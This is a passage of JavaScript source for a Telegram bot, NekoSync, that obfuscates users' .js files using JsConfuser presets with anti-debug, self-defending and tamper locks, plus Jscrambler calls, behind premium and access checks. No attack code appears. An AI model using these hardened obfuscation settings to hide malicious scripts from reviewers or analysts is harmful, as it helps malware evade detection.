        "أ", "ب", "ت", "ث", "ج", "ح", "خ", "د", "ذ", "ر",
        "ز", "س", "ش", "ص", "ض", "ط", "ظ", "ع", "غ", "ف",
        "ق", "ك", "ل", "م", "ن", "ه", "و", "ي"
    ];

    const generateArabicName = () => {
        const length = Math.floor(Math.random() * 4) + 3;
        let name = "";
        for (let i = 0; i < length; i++) {
            name += arabicChars[Math.floor(Math.random() * arabicChars.length)];
        }
        return name;
    };

    return {
        target: "node",
        compact: true,
        renameVariables: true,
        renameGlobals: true,
        identifierGenerator: () => generateArabicName(),
        stringEncoding: true,
        stringSplitting: true,
        controlFlowFlattening: 0.95,
        shuffle: true,
        duplicateLiteralsRemoval: true,
        deadCode: true,
        calculator: true,
        opaquePredicates: true,
        lock: {
            selfDefending: true,
            antiDebug: true,
            integrity: true,
            tamperProtection: true
        }
    };
};

const getJapanxArabObfuscationConfig = () => {
    const japaneseXArabChars = [
        "あ", "い", "う", "え", "お", "か", "き", "く", "け", "こ",
        "さ", "し", "す", "せ", "そ", "た", "ち", "つ", "て", "と",
        "な", "に", "ぬ", "ね", "の", "は", "ひ", "ふ", "へ", "ほ",
        "ま", "み", "む", "め", "も", "や", "ゆ", "よ","أ", "ب", "ت", "ث", "ج", "ح", "خ", "د", "ذ", "ر",
        "ز", "س", "ش", "ص", "ض", "ط", "ظ", "ع", "غ", "ف",
        "ق", "ك", "ل", "م", "ن", "ه", "و", "ي","ら", "り", "る", "れ", "ろ", "わ", "を", "ん" 
    ];

    const generateJapaneseXArabName = () => {
        const length = Math.floor(Math.random() * 4) + 3; // Panjang 3-6 karakter
        let name = "";
        for (let i = 0; i < length; i++) {
            name += japaneseXArabChars[Math.floor(Math.random() * japaneseXArabChars.length)];
        }
        return name;
    };

    return {
        target: "node",
        compact: true,
        renameVariables: true,
        renameGlobals: true,
        identifierGenerator: () => generateJapaneseXArabName(),
        stringCompression: true, // Kompresi string
        stringConcealing: true, // Menyembunyikan string
        stringEncoding: true, // Enkripsi string
        stringSplitting: true, // Memecah string        
        controlFlowFlattening: 0.95, // Sedikit lebih rendah untuk variasi
        flatten: true,              // Metode baru: mengganti struktur kontrol
        shuffle: true,
        rgf: false,
        dispatcher: true,
        duplicateLiteralsRemoval: true,
        deadCode: true,
        calculator: true,
        opaquePredicates: true,
        lock: {
            selfDefending: true,
            antiDebug: true,
            integrity: true,
            tamperProtection: true
        }
    };
};
const getUltraObfuscationConfig = () => {
    const generateUltraName = () => {
        const chars = "abcdefghijklmnopqrstuvwxyz";
        const numbers = "0123456789";
        const randomNum = numbers[Math.floor(Math.random() * numbers.length)];
        const randomChar = chars[Math.floor(Math.random() * chars.length)];
        return `z${randomNum}${randomChar}${Math.random().toString(36).substring(2, 6)}`;
    };

    return {
        target: "node",
        compact: true,
        renameVariables: true,
        renameGlobals: true,
        identifierGenerator: () => generateUltraName(),
        stringCompression: true, // Kompresi string untuk keamanan tinggi
        stringEncoding: true,
        stringSplitting: true,
        controlFlowFlattening: 0.9,
        flatten: true,
        shuffle: true,
        rgf: true, // Randomized Global Functions
        deadCode: true,
        opaquePredicates: true,
        dispatcher: true,
        lock: {
            selfDefending: true,
            antiDebug: true,
            integrity: true,
            tamperProtection: true
        }
    };
};

// Konfigurasi obfuscation untuk Japan style (diperkuat dan aman)
const getJapanObfuscationConfig = () => {
    const japaneseChars = [
        "あ", "い", "う", "え", "お", "か", "き", "く", "け", "こ",
        "さ", "し", "す", "せ", "そ", "た", "ち", "つ", "て", "と",
        "な", "に", "ぬ", "ね", "の", "は", "ひ", "ふ", "へ", "ほ",
        "ま", "み", "む", "め", "も", "や", "ゆ", "よ",
        "ら", "り", "る", "れ", "ろ", "わ", "を", "ん"
    ];

    const generateJapaneseName = () => {
        const length = Math.floor(Math.random() * 4) + 3; // Panjang 3-6 karakter
        let name = "";
        for (let i = 0; i < length; i++) {
            name += japaneseChars[Math.floor(Math.random() * japaneseChars.length)];
        }
        return name;
    };

    return {
        target: "node",
        compact: true,
        renameVariables: true,
        renameGlobals: true,
        identifierGenerator: () => generateJapaneseName(),
        stringEncoding: true,
        stringSplitting: true,
        controlFlowFlattening: 0.9, // Sedikit lebih rendah untuk variasi
        flatten: true,              // Metode baru: mengganti struktur kontrol
        shuffle: true,
        duplicateLiteralsRemoval: true,
        deadCode: true,
        calculator: true,
        opaquePredicates: true,
        lock: {
            selfDefending: true,
            antiDebug: true,
            integrity: true,
            tamperProtection: true
        }
    };
};

// Konfigurasi obfuscation untuk /encnew (diperkuat dan aman)
const getNewObfuscationConfig = () => ({
    target: "node",
    compact: true,
    renameVariables: true,
    renameGlobals: true,
    identifierGenerator: "mangled",
    stringEncoding: true,
    stringSplitting: true,
    controlFlowFlattening: 0.95,
    shuffle: true,
    duplicateLiteralsRemoval: true,
    deadCode: true,
    calculator: true,
    opaquePredicates: true,
    lock: {
        selfDefending: true,
        antiDebug: true,
        integrity: true,
        tamperProtection: true
    }
});

// Progress bar
const createProgressBar = (percentage) => {
    const total = 10;
    const filled = Math.round((percentage / 100) * total);
    return "▰".repeat(filled) + "▱".repeat(total - filled);
};

// Update progress
async function updateProgress(ctx, message, percentage, status) {
    const bar = createProgressBar(percentage);
    const levelText = percentage === 100 ? "✅ Selesai" : `⚙️ ${status}`;
    try {
        await ctx.telegram.editMessageText(
            ctx.chat.id,
            message.message_id,
            null,
            "```css\n" +
            "🔒 EncryptBot\n" +
            ` ${levelText} (${percentage}%)\n` +
            ` ${bar}\n` +
            "```\n" +
            "Processing Encryption",
            { parse_mode: "Markdown" }
        );
        await new Promise(resolve => setTimeout(resolve, Math.min(800, percentage * 8)));
    } catch (error) {
        log("Gagal memperbarui progres", error);
    }
}

// Fungsi untuk mengaburkan file menggunakan metode obf1
async function obf1(inputFile) {
    const options = {
        target: "node",
        preset: "high",
        compact: true,
        controlFlowFlattening: 0.75,
        deadCode: 0.2,
        renameVariables: true,
        minify: true,
    };
  const code = fs.readFileSync(inputFile, 'utf8');
  return await obfuscateFile(code, options);
}

// Fungsi untuk mengaburkan file menggunakan metode obf2
async function obf2(inputFile) {
    const options = {
        target: "node",
        preset: "medium",
        compact: true,
        controlFlowFlattening: 0.5,
        deadCode: 0.1,
        renameVariables: false,
        minify: false,
    };
  const code = fs.readFileSync(inputFile, 'utf8');
  return await obfuscateFile(code, options);
}

// Fungsi untuk mengaburkan file menggunakan metode obf3
async function obf3(inputFile) {
    const options = {
        target: "node",
        preset: "low",
        compact: true,
        controlFlowFlattening: 0.25,
        deadCode: 0.05,
        renameVariables: true,
        minify: true,
    };
  const code = fs.readFileSync(inputFile, 'utf8');
  return await obfuscateFile(code, options);
}

// Fungsi untuk metode obfuscation lainnya
async function obf4(inputFile) {
  const options = {
      target: "node",
      preset: "high", // Pilih tingkat preset (high, medium, low)
      calculator: true,
      compact: true,
      hexadecimalNumbers: true,
      controlFlowFlattening: 0.75,
      deadCode: 0.2,
      dispatcher: true,
      duplicateLiteralsRemoval: 0.75,
      flatten: true,
      globalConcealing: true,
      identifierGenerator: 'randomized',
      minify: true,
      movedDeclarations: true,
      objectExtraction: true,
      opaquePredicates: 0.75,
      renameVariables: true,
      renameGlobals: true,
      shuffle: {
          hash: 0.5,
          true: 0.5,
      },
      stack: true,
      stringConcealing: true,
      stringCompression: true,
      stringEncoding: true,
      stringSplitting: 0.75,
      rgf: false,
  };
  const code = fs.readFileSync(inputFile, 'utf8');
  return await obfuscateFile(code, options);
}

async function obf5(inputFile) {
  const options = {
      target: "node",
      calculator: true,
      compact: true,
      hexadecimalNumbers: true,
      controlFlowFlattening: 0.75,
      deadCode: 0.2,
      dispatcher: true,
      duplicateLiteralsRemoval: 0.75,
      flatten: true,
      globalConcealing: true,
      identifierGenerator: 'mangled',
      minify: true,
      movedDeclarations: true,
      objectExtraction: true,
      opaquePredicates: 0.75,
      renameVariables: true,
      renameGlobals: true,
      shuffle: {
          hash: 0.5,
          true: 0.5,
      },
      stack: true,
      stringConcealing: true,
      stringCompression: true,
      stringEncoding: true,
      stringSplitting: 0.75,
      rgf: false,
  };
  const code = fs.readFileSync(inputFile, 'utf8');
  return await obfuscateFile(code, options);
}

async function obf6(inputFile) {
  const options = {
      target: "node",
      calculator: true,
      compact: true,
      hexadecimalNumbers: true,
      controlFlowFlattening: 0.75,
      deadCode: 0.2,
      dispatcher: true,
      duplicateLiteralsRemoval: 0.75,
      flatten: true,
      globalConcealing: true,
      identifierGenerator: 'zeroWidth',
      minify: true,
      movedDeclarations: true,
      objectExtraction: true,
      opaquePredicates: 0.75,
      renameVariables: true,
      renameGlobals: true,
      shuffle: {
          hash: 0.5,
          true: 0.5,
      },
      stack: true,
      stringConcealing: true,
      stringCompression: true,
      stringEncoding: true,
      stringSplitting: 0.75,
      rgf: false,
  };
  const code = fs.readFileSync(inputFile, 'utf8');
  return await obfuscateFile(code, options);
}

async function obf7(inputFile) {
  const options = {
      target: "node",
      calculator: true,
      compact: true,
      hexadecimalNumbers: true,
      controlFlowFlattening: 0.75,
      deadCode: 0.2,
      dispatcher: true,
      duplicateLiteralsRemoval: 0.75,
      flatten: true,
      globalConcealing: true,
      identifierGenerator: 'randomized',
      lock: {
          antiDebug: true,
      },
      minify: true,
      movedDeclarations: true,
      objectExtraction: true,
      opaquePredicates: 0.75,
      renameVariables: true,
      renameGlobals: true,
      shuffle: {
          hash: 0.5,
          true: 0.5,
      },
      stack: true,
      stringConcealing: true,
      stringCompression: true,
      stringEncoding: true,
      stringSplitting: 0.75,
      rgf: false,
  };
  const code = fs.readFileSync(inputFile, 'utf8');
  return await obfuscateFile(code, options);
}

async function obf8(inputFile) {
  const options = {
      target: "node",
      es5: true,
      calculator: true,
      compact: true,
      hexadecimalNumbers: true,
      controlFlowFlattening: 0.75,
      deadCode: 0.2,
      dispatcher: true,
      duplicateLiteralsRemoval: 0.75,
      flatten: true,
      globalConcealing: true,
      identifierGenerator: 'randomized',
      minify: false,
      movedDeclarations: true,
      objectExtraction: true,
      opaquePredicates: 0.75,
      renameVariables: true,
      renameGlobals: true,
      shuffle: {
          hash: 0.5,
          true: 0.5,
      },
      stack: true,
      stringConcealing: true,
      stringCompression: true,
      stringEncoding: true,
      stringSplitting: 0.75,
      rgf: false,
  };
  const code = fs.readFileSync(inputFile, 'utf8');
  return await obfuscateFile(code, options);
}

// Fungsi untuk obfuscate method untuk Jscrambler
async function obfuscateWithJscrambler(filePath) {
  try {
    const response = await jscrambler.protectAndDownload({
          keys: jscramblerConfig.keys,
          applicationId: jscramblerConfig.applicationId,
          filesSrc: [filePath],
          filesDest: [filePath],
          params: [
              { name: 'objectPropertiesSparsing' },
              { name: 'variableMasking' },
              { name: 'dotToBracketNotation' },
              { name: 'whitespaceRemoval' },
              { name: 'stringConcealing' },
              { name: 'functionReordering' },
              { name: 'propertyKeysObfuscation' },
              { name: 'regexObfuscation' },
              { name: 'controlFlowFlattening' },
              { name: 'booleanToAnything' },
              { name: 'identifiersRenaming' },
              { name: 'globalVariableIndirection' }
          ],
      });

      if (response && response.code) {
          return response.code // Return the path of the output file
      } else {
          throw new Error('No obfuscated code returned from Jscrambler.');
      }
  } catch (error) {
      throw new Error('Error during obfuscation: ' + error.message);
  }
}

// Fungsi untuk obfuscate method untuk Jscrambler dengan konfigurasi tambahan
async function obfuscateWithJscrambler2(filePath) {
  try {
      const response = await jscrambler.protectAndDownload({
          keys: jscramblerConfig.keys,
          applicationId: jscramblerConfig.applicationId,
          filesSrc: [filePath],
          filesDest: [filePath],
          params: [
              { name: 'objectPropertiesSparsing' },
              { name: 'variableMasking' },
              { name: 'dotToBracketNotation' },
              { name: 'whitespaceRemoval' },
              { name: 'stringConcealing' },
              { name: 'functionReordering' },
              { name: 'propertyKeysObfuscation' },
              { name: 'regexObfuscation' },
              { name: 'controlFlowFlattening' },
              { name: 'booleanToAnything' },
              { name: 'identifiersRenaming' },
              { name: 'globalVariableIndirection' },
              {
                  name: "dateLock",
                  options: {
                      countermeasures: {
                          breakApplication: true
                      },
                      startDate: "2024/11/11",
                      endDate: "2024/11/13"
                  }
              }
          ],
      });

      if (response && response.code) {
          return response.code; // Return the path of the output file
     } else {
          throw new Error('No obfuscated code returned from Jscrambler.');
      }
  } catch (error) {
      throw new Error('Error during obfuscation: ' + error.message);
  }
}

bot.use(async (ctx, next) => {
readAccess()
checkAndCreateRedeemFile()
checkAndCreateUsersFile();
    const isBotActive = await checkBotStatus();
    if (!isBotActive) {
        return ctx.reply('┌  ◦ [ Bot Under Maintenance ]\n│  ◦ Sorry, Bot is in Private Mode\n└  ◦ No One Can Use This Bot');
    }
    return next();
});

// Middleware untuk memeriksa akses pengguna
bot.use((ctx, next) => {
  const userId = ctx.from.id;
  const ownerId = ctx.from.id;
  if (OWNER_ID.includes(userId)) {
    return next()
  }
  const accessList = readAccess();
  const photoUrl = 'https://files.catbox.moe/nvt0cd.jpg';
  if (accessList.includes(userId)) {
    return next(); // Lanjutkan jika pengguna memiliki akses
  } else {
    const caption = '┏─圓 𝑨𝒄𝒄𝒆𝒔𝒔 - 𝑫𝒆𝒏𝒊𝒆𝒅 圓─㍐\n┃ 参 Sorry, You Do Not Have\n┃ 参 Access To Use This Bot\n┃ 参 Contact Owner To\n┃ 参 Request Access\n┗\n┏─圓 𝑺𝒌𝒚𝑶𝒇𝑫𝒆𝒔𝒕𝒓𝒖𝒄𝒕𝒊𝒐𝒏𝒔 圓─㍐\n┃ t.me/ChannelSkyNemesis\n┃ ⌕ ❙❘❙❙❘❙❚❙❘❙❙❚❙❘❙❘❙❚❙❘❙❙❚❙❘❙❙❘❙❚❙❘ ⌕\n┃    『 *© 𝑵𝒆𝒌𝒐𝑺𝒚𝒏𝒄𝑬𝒏𝒄𝒓𝒚𝒑𝒕𝒊𝒐𝒏🔍* 』\n┗──────────────────────༓ ⳹\nStay secure with NekoSync!'; // Blokir jika tidak memiliki akses
    const keyboard = [
      [{
          text: "Contact Owner",
          url: "https://t.me/NightCoreMDs"
        },
        {
          text: "Join With Us",
          url: "https://t.me/ChannelSkyNemesis"
        }
      ],
      [{
        text: "Donate Me",
        url: "https://trakteer.id/NightCores"
      }]
    ];

    // Mengirim gambar dengan caption dan inline keyboard
    ctx.replyWithPhoto(photoUrl, {
      caption: caption,
      reply_markup: {
        inline_keyboard: keyboard
      }
    }).then(() => {
      console.log('Done response sent');
    }).catch((error) => {
      console.error('Error sending done response:', error);
    });
  }
});

bot.start(ctx => {
function getUserStatus(userId) {
    if (OWNER_ID.includes(userId)) {
        return "Owner";
    } else if (isPremium(userId)) {
        return "Premium";
    } else {
        return "Member";
    }
}
const status = getUserStatus(ctx.from.id);
  const menuMessage = `
⏤͟͟͞͞╳── [ Welcome - Users ] ── .々─ᯤ
│ =〆 Welcome to NekoSync - Assistant
│ =〆 Select a menu below
│ =〆 To discover its features
⏤͟͟͞͞╳────────── .✦

┌  ◦ [ Information - Users ]
│  ◦ Name : ${ctx.from.first_name}${ctx.from.last_name}
│  ◦ Username : ${ctx.from.username}
│  ◦ Rank : ${status}
└  ◦ ID : ${ctx.from.id}
`;

  const keyboard = [
    [{
      text: "Free Obfuscation",
      callback_data: "obf_free"
    },
    ],
    [{
        text: "Premium Menu",
        callback_data: "premium_menu"
      },
      {
        text: "Random Menu",
        callback_data: "random_menu"
      }
    ],
    [{
      text: "Contact Dev",
      url: "https://t.me/NightCoreMDs"
    },
    ],
    [{
        text: "Donate Me",
        url: "https://trakteer.id/NightCores"
      },
      {
        text: "Join With Us",
        url: "https://t.me/ChannelSkyNemesis"
      }
    ],
    [{
      text: "Credits",
      callback_data: "#"
    },
    ]
  ];


  ctx.replyWithPhoto("https://files.catbox.moe/nvt0cd.jpg", {
    caption: menuMessage,
    reply_markup: {
      inline_keyboard: keyboard
    }
  });
});

// Action untuk tombol "main_menu"
bot.action("main_menu", (ctx) => {
function getUserStatus(userId) {
    if (OWNER_ID.includes(userId)) {
        return "Owner";
    } else if (isPremium(userId)) {
        return "Premium";
    } else {
        return "Member";
    }
}
    const status = getUserStatus(ctx.from.id);
    const menuMessage = `
⏤͟͟͞͞╳── [ Welcome - Users ] ── .々─ᯤ
│ =〆 Welcome to NekoSync - Assistant
│ =〆 Select a menu below
│ =〆 To discover its features
⏤͟͟͞͞╳────────── .✦

┌  ◦ [ Information - Users ]
│  ◦ Name : ${ctx.from.first_name} ${ctx.from.last_name || ''}
│  ◦ Username : ${ctx.from.username || 'N/A'}
│  ◦ Rank : ${status}
└  ◦ ID : ${ctx.from.id}
`;

    const keyboard = [
        [{ text: "Free Obfuscation", callback_data: "obf_free" }],
        [
            { text: "Premium Menu", callback_data: "premium_menu" },
            { text: "Random Menu", callback_data: "random_menu" }
        ],
        [{ text: "Contact Dev", url: "https://t.me/NightCoreMDs" }],
        [
            { text: "Donate Me", url: "https://trakteer.id/NightCores" },
            { text: "Join With Us", url: "https://t.me/ChannelSkyNemesis" }
        ],
        [{ text: "Information", callback_data: "info_bot" }],
        [{ text: "Credits", callback_data: "script_credits" }]
    ];

    // Jika pesan sudah ada, edit pesan tersebut
    if (ctx.callbackQuery) {
        ctx.editMessageCaption(menuMessage, {
            parse_mode: "Markdown",
            reply_markup: { inline_keyboard: keyboard }
        });
    } else {
        // Jika pesan belum ada, kirim pesan baru
        ctx.replyWithPhoto("https://files.catbox.moe/nvt0cd.jpg", {
            caption: menuMessage,
            parse_mode: "Markdown",
            reply_markup: { inline_keyboard: keyboard }
        });
    }
});

// Action untuk tombol "Info"
bot.action("info_bot", (ctx) => {
    ctx.editMessageCaption(`
┏─圓 𝑵𝒆𝒌𝒐𝑺𝒚𝒏𝒄 𝑩𝒐𝒕 𝑰𝒏𝒇𝒐 圓─㍐
┃ 参 ɪɴᴛᴇɴsɪᴛʏ : 1 - 10 [ CONTROL FLOW ]
┃ 参 ʟᴇᴠᴇʟs : Low | Medium | Hight
┃ 参 ᴄʜᴀɴɴᴇʟ : @ChannelSkyNemesis
┃ 参 ᴅᴇᴠᴇʟᴏᴘᴇʀ : @NightCoreMDs
┗
┏─圓 𝑺𝒌𝒚𝑶𝒇𝑫𝒆𝒔𝒕𝒓𝒖𝒄𝒕𝒊𝒐𝒏𝒔 圓─㍐
┃ t.me/ChannelSkyNemesis
┃ ⌕ ❙❘❙❙❘❙❚❙❘❙❙❚❙❘❙❘❙❚❙❘❙❙❚❙❘❙❙❘❙❚❙❘ ⌕
┃    『 *© 𝑵𝒆𝒌𝒐𝑺𝒚𝒏𝒄𝑬𝒏𝒄𝒓𝒚𝒑𝒕𝒊𝒐𝒏🔍* 』
┗──────────────────────༓ ⳹
Stay secure with NekoSync!
    `, {
        parse_mode: "Markdown",
        reply_markup: {
            inline_keyboard: [
                [
                    { text: 'Channel', url: 'https://whatsapp.com/channel/0029Vb1xy0NFHWq8K0UAkv0f' },
                    { text: 'Developer', url: 'https://t.me/NightCoreMDs' }
                ],
                [{ text: '🔙 BACK', callback_data: 'main_menu' }]
            ]
        }
    });
});

// Action untuk tombol "Info"
bot.action("obf_free", (ctx) => {
    ctx.editMessageCaption(`
┏─圓 𝑰𝑵𝑭𝑶𝑹𝑴𝑨𝑻𝑰𝑶𝑵 𝑩𝑶𝑻𝒁 圓─㍐
┃ ㉿ *Botname :* NekoSync - Assistant
┃ ㉿ *Mode :* Public
┃ ㉿ *Developer :* @NightCoreMDs
┃ ㉿ *Runtime Bot :* ${upTime}
┃ ㉿ *Donate :* [Link Donate](https://trakteer.id/NightCores)
┗
┏─圓 𝑶𝒃𝒇𝒖𝒔𝒄𝒂𝒕𝒊𝒐𝒏 𝑴𝒆𝒏𝒖 圓─㍐
┃ 参 /obf1 - very low Obfuscation
┃ 参 /obf2 - low Obfuscation 
┃ 参 /obf3 - Medium Obfuscation 
┃ 参 /obf4 - high Obfuscation 
┃ 参 /obf5 - A, B, C, D Obfuscation 
┃ 参 /obf6 - Zero Width Obfuscation 
┃ 参 /obf7 - Anti Debug Obfuscation 
┃ 参 /obf8 - Array Obfuscation 
┗
┏─圓 𝑺𝒌𝒚𝑶𝒇𝑫𝒆𝒔𝒕𝒓𝒖𝒄𝒕𝒊𝒐𝒏𝒔 圓─㍐
┃ t.me/ChannelSkyNemesis
┃ ⌕ ❙❘❙❙❘❙❚❙❘❙❙❚❙❘❙❘❙❚❙❘❙❙❚❙❘❙❙❘❙❚❙❘ ⌕
┃    『 *© 𝑵𝒆𝒌𝒐𝑺𝒚𝒏𝒄𝑬𝒏𝒄𝒓𝒚𝒑𝒕𝒊𝒐𝒏🔍* 』
┗──────────────────────༓ ⳹
    `, {
        parse_mode: "Markdown",
        reply_markup: {
            inline_keyboard: [
                [
                    { text: 'Channel', url: 'https://whatsapp.com/channel/0029Vb1xy0NFHWq8K0UAkv0f' },
                    { text: 'Developer', url: 'https://t.me/NightCoreMDs' }
                ],
                [{ text: '🔙 BACK', callback_data: 'main_menu' }]
            ]
        }
    });
});

// Action untuk tombol "Settings" (placeholder)
bot.action("random_menu", (ctx) => {
    ctx.editMessageCaption(`
┏─圓 𝑰𝑵𝑭𝑶𝑹𝑴𝑨𝑻𝑰𝑶𝑵 𝑩𝑶𝑻𝒁 圓─㍐
┃ ㉿ *Botname :* NekoSync - Assistant
┃ ㉿ *Mode :* Public
┃ ㉿ *Developer :* @NightCoreMDs
┃ ㉿ *Runtime Bot :* ${upTime}
┃ ㉿ *Donate :* [Link Donate](https://trakteer.id/NightCores)
┗
┏─圓 𝑹𝒂𝒏𝒅𝒐𝒎 𝑴𝒆𝒏𝒖 圓─㍐
┃ 参 /installpanel
┃ 参 /addsubdomain 
┃ 参 /broadcast
┃ 参 /payment
┃ 参 /addprem
┃ 参 /delprem
┃ 参 /listprem
┃ 参 /addaccess
┃ 参 /delaccess
┃ 参 /listaccess
┃ 参 /addredeem
┃ 参 /delredeem
┃ 参 /listredeem
┃ 参 /redeem
┗
┏─圓 𝑺𝒌𝒚𝑶𝒇𝑫𝒆𝒔𝒕𝒓𝒖𝒄𝒕𝒊𝒐𝒏𝒔 圓─㍐
┃ t.me/ChannelSkyNemesis
┃ ⌕ ❙❘❙❙❘❙❚❙❘❙❙❚❙❘❙❘❙❚❙❘❙❙❚❙❘❙❙❘❙❚❙❘ ⌕
┃    『 *© 𝑵𝒆𝒌𝒐𝑺𝒚𝒏𝒄𝑬𝒏𝒄𝒓𝒚𝒑𝒕𝒊𝒐𝒏🔍* 』
┗──────────────────────༓ ⳹
    `, {
        parse_mode: "Markdown",
        reply_markup: {
            inline_keyboard: [
                [
                    { text: 'Channel', url: 'https://whatsapp.com/channel/0029Vb1xy0NFHWq8K0UAkv0f' },
                    { text: 'Developer', url: 'https://t.me/NightCoreMDs' }
                ],
                [{ text: '🔙 BACK', callback_data: 'main_menu' }]
            ]
        }
    });
});

// Action untuk kembali ke menu utama
bot.action("premium_menu", (ctx) => {
    ctx.editMessageCaption(`┏─圓 𝑰𝑵𝑭𝑶𝑹𝑴𝑨𝑻𝑰𝑶𝑵 𝑩𝑶𝑻𝒁 圓─㍐
┃ ㉿ *Botname :* NekoSync - Assistant
┃ ㉿ *Mode :* Public
┃ ㉿ *Developer :* @NightCoreMDs
┃ ㉿ *Runtime Bot :* ${upTime}
┃ ㉿ *Donate :* [Link Donate](https://trakteer.id/NightCores)
┗
┏─圓 𝑶𝒃𝒇𝒖𝒔𝒄𝒂𝒕𝒊𝒐𝒏 𝑴𝒆𝒏𝒖 圓─㍐
┃ 参 /enc <Level> - Standard Obfuscation  
┃ 参 /enceval <Level> - Evaluate & Obfuscate  
┃ 参 /encchina - Mandarin Style  
┃ 参 /encarab - Arabic Style  
┃ 参 /encjapan - Japanese Style  
┃ 参 /encinvis - Invisible Mode  
┃ 参 /encjapxab - Japan X Arab  
┃ 参 /encx - Base 64  
┃ 参 /encnebula - Hard Design  
┃ 参 /encnova - Nova Style  
┃ 参 /encsiu - Siu + Calcrick  
┗
┏─圓 𝑺𝒌𝒚𝑶𝒇𝑫𝒆𝒔𝒕𝒓𝒖𝒄𝒕𝒊𝒐𝒏𝒔 圓─㍐
┃ t.me/ChannelSkyNemesis
┃ ⌕ ❙❘❙❙❘❙❚❙❘❙❙❚❙❘❙❘❙❚❙❘❙❙❚❙❘❙❙❘❙❚❙❘ ⌕
┃    『 *© 𝑵𝒆𝒌𝒐𝑺𝒚𝒏𝒄𝑬𝒏𝒄𝒓𝒚𝒑𝒕𝒊𝒐𝒏🔍* 』
┗──────────────────────༓ ⳹`, {
        parse_mode: "Markdown",
        reply_markup: {
            inline_keyboard: [
                [
                    { text: 'Channel', url: 'https://whatsapp.com/channel/0029Vb1xy0NFHWq8K0UAkv0f' },
                    { text: 'Developer', url: 'https://t.me/NightCoreMDs' }
                ],
                [
                    { text: '🔙 BACK', callback_data: 'main_menu' },
                    { text: '🔜 NEXT', callback_data: 'premium_menuV2' }
                ]
            ]
        }
    });
});

// Action untuk kembali ke menu utama
bot.action("premium_menuV2", (ctx) => {
    ctx.editMessageCaption(`┏─圓 𝑰𝑵𝑭𝑶𝑹𝑴𝑨𝑻𝑰𝑶𝑵 𝑩𝑶𝑻𝒁 圓─㍐
┃ ㉿ *Botname :* NekoSync - Assistant
┃ ㉿ *Mode :* Public
┃ ㉿ *Developer :* @NightCoreMDs
┃ ㉿ *Runtime Bot :* ${upTime}
┃ ㉿ *Donate :* [Link Donate](https://trakteer.id/NightCores)
┗
┏─圓 𝑶𝒃𝒇𝒖𝒔𝒄𝒂𝒕𝒊𝒐𝒏 𝑴𝒆𝒏𝒖 圓─㍐
┃ 参 /customenc <Name> - Custom Design  
┃ 参 /encmax <Intensity> - Custom Intensity  
┃ 参 /encstralth - Stealth Mode  
┃ 参 /encstrong - Power Fortress  
┃ 参 /encultra - Ultra Protection  
┃ 参 /deobfuscate - Decrypt File  
┃ 参 /encbig <Mb> - Megabyte Mode  
┃ 参 /encnew - Advanced Layer  
┃ 参 /encquantum - Quantum Fortex  
┃ 参 /enclocked - Locked Hard  
┃ 参 /aph - Aphro Obfuscation 
┃ 参 /aph2 - AphroV2 Obfuscation 
┗
┏─圓 𝑺𝒌𝒚𝑶𝒇𝑫𝒆𝒔𝒕𝒓𝒖𝒄𝒕𝒊𝒐𝒏𝒔 圓─㍐
┃ t.me/ChannelSkyNemesis
┃ ⌕ ❙❘❙❙❘❙❚❙❘❙❙❚❙❘❙❘❙❚❙❘❙❙❚❙❘❙❙❘❙❚❙❘ ⌕
┃    『 *© 𝑵𝒆𝒌𝒐𝑺𝒚𝒏𝒄𝑬𝒏𝒄𝒓𝒚𝒑𝒕𝒊𝒐𝒏🔍* 』
┗──────────────────────༓ ⳹`, {
        parse_mode: "Markdown",
        reply_markup: {
            inline_keyboard: [
                [
                    { text: 'Channel', url: 'https://whatsapp.com/channel/0029Vb1xy0NFHWq8K0UAkv0f' },
                    { text: 'Developer', url: 'https://t.me/NightCoreMDs' }
                ],
                [{ text: '🔙 BACK', callback_data: 'premium_menu' }]
            ]
        }
    });
});


// Command /enc (diperkuat dengan pemeriksaan channel)
bot.command("enc", async (ctx) => {
users.add(ctx.from.id);
    saveUsers(users);
    const isMember = await checkChannelMembership(ctx);
    if (!isMember) {
        return ctx.replyWithMarkdown(
            "❌ E̶R̶R̶O̶R̶ │ ⓘ ᴀɴᴅᴀ ʜᴀʀᴜs ʙᴇʀɢᴀʙᴜɴɢ ᴋᴇ ᴄʜᴀɴɴᴇʟ @ChannelSkyNemesis ᴛᴇʀʟᴇʙɪʜ ᴅᴀʜᴜʟᴜ sᴇʙᴇʟᴜᴍ ᴍᴇᴍᴀᴋᴀɪ ʙᴏᴛ ᴏʙғ ɴʏᴀ!! \n" +
            "[ᴊᴏɪɴ sᴇᴋᴀʀᴀɴɢ](https://https://t.me/ChannelSkyNemesis)"
        );
    }
    const userId = ctx.from.id;

    // Cek apakah pengguna adalah premium
    if (!isPremium(userId)) {
      return ctx.reply('❌ This feature is for premium users only. Upgrade to premium to use this command.');
    }

    if (!ctx.message.reply_to_message || !ctx.message.reply_to_message.document) {
        return ctx.replyWithMarkdown("❌ *Error:* Balas file .js dengan `/enc [level]`!");
    }

    const file = ctx.message.reply_to_message.document;
    if (!file.file_name.endsWith(".js")) {
        return ctx.replyWithMarkdown("❌ *Error:* Hanya file .js yang didukung!");
    }

    const args = ctx.message.text.split(" ");
    const encryptionLevel = ["low", "medium", "high"].includes(args[1]) ? args[1] : "high";
    const encryptedPath = path.join(__dirname, `encrypted-${file.file_name}`);

    try {
        const progressMessage = await ctx.replyWithMarkdown(
            "```css\n" +
            "🔒 EncryptBot\n" +
            ` ⚙️ Memulai (${encryptionLevel}) (1%)\n` +
            ` ${createProgressBar(1)}\n` +
            "```\n" +
            "Processing Encryption"
        );
        
        const fileLink = await ctx.telegram.getFileLink(file.file_id);
        log(`Mengunduh file: ${file.file_name}`);
        await updateProgress(ctx, progressMessage, 10, "Mengunduh");
        const response = await fetch(fileLink);
        const fileContent = await response.text();
        await updateProgress(ctx, progressMessage, 30, "Mengunduh Selesai");

        log(`Memvalidasi kode: ${file.file_name}`);
        await updateProgress(ctx, progressMessage, 40, "Memvalidasi Kode");
        try {
            new Function(fileContent);
        } catch (syntaxError) {
            throw new Error(`Kode tidak valid: ${syntaxError.message}`);
        }

        log(`Mengenkripsi file dengan level: ${encryptionLevel}`);
        await updateProgress(ctx, progressMessage, 50, "Inisialisasi Hardened Enkripsi");
        const obfuscated = await JsConfuser.obfuscate(fileContent, getObfuscationConfig(encryptionLevel));
        await updateProgress(ctx, progressMessage, 70, "Transformasi Kode");
        await fs.writeFile(encryptedPath, obfuscated.code);
        await updateProgress(ctx, progressMessage, 90, "Finalisasi Enkripsi");

        log(`Memvalidasi hasil obfuscation: ${file.file_name}`);
        try {
            new Function(obfuscated.code);
        } catch (postObfuscationError) {
